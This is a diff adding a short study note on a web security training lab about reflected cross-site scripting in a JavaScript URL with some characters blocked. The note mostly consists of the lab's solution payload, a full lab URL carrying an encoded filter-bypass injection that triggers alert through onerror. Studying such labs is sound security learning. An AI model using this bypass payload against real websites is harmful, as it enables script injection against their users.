@@ -1,0 +1,5 @@
+Reflected XSS in a JavaScript URL with some characters blocked
+
+Not much to say but to admire the amazing payload. It's in the solution, but I'll add it here too:
+
+https://ac0e1fd11e0bb55a80d4217f00b400b3.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
